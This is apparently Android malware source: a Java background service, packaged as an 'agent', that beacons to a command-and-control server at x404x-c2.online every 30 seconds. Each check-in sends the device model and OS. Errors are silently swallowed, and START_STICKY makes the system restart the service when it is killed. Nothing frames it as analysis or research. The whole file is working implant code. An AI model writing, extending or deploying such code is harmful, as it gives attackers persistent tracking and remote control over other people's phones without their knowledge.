package com.x404x.agent;
import android.app.Service; import android.content.Intent; import android.os.IBinder;
import android.os.Handler; import android.os.Looper; import java.util.concurrent.TimeUnit;
public class X404XService extends Service {
    private Handler handler; private boolean running;
    public IBinder onBind(Intent i) { return null; }
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler = new Handler(Looper.getMainLooper()); running = true;
        new Thread(() -> { while(running) { try {
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL("https://x404x-c2.online:8443/checkin").openConnection();
            c.setRequestMethod("POST"); c.setRequestProperty("X-Agent-ID", android.os.Build.MODEL);
            c.setRequestProperty("X-Agent-OS", "android"); c.getResponseCode();
            TimeUnit.SECONDS.sleep(30);
        } catch(Exception e) {} } }).start();
        return START_STICKY;
    }
    public void onDestroy() { running = false; super.onDestroy(); }
}
